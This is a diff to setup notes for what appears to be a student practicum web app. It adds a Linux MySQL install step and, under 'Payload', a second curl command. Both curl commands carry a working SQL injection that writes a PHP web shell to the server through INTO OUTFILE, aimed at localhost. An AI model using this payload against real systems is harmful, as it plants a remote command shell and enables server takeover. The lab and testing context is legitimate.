@@ -5,6 +5,9 @@
 ```
 brew install mysql
 brew services start mysql
+
+## on linux use this command
+sudo apt install mysql-server
 ```
 
 ## 2. Secure MySQL and Set Root Password
@@ -117,3 +120,6 @@ Keep this file for future reference when setting up or resetting your environmen
 
 Payload --
 curl "http://localhost:8080/receipt.php?id=1%3B%20SELECT%20'%3C%3Fphp%20system(%24_GET%5B%22cmd%22%5D)%3B%20%3F%3E'%20INTO%20OUTFILE%20'/Users/sid/Documents/CMU/Fall%202025/Practicum/web_app/php_app/shell.php'%20--"
+
+
+curl "http://localhost:8080/receipt.php?id=1%3B%20SELECT%20'%3C%3Fphp%20system(%24_GET%5B%22cmd%22%5D)%3B%20%3F%3E'%20INTO%20OUTFILE%20'/home/student/Desktop/web_app/php_app/shell.php'%20--"
